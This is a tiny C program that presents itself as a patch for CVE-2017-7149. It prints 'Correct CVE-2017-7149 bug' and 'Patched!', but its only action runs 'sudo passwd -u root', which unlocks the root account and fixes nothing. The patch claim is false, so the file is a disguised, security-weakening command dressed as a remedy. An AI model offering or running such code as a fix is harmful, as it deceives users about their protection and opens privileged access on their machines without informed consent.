#include <stdio.h>
#include <stdlib.h>
int main(){
    char * command = "sudo passwd -u root ";
    printf("Correct CVE-2017-7149 bug\n\nPatch by hageok\n");

    system(command);

    printf("\nPatched!\n");

    return 0;
    
}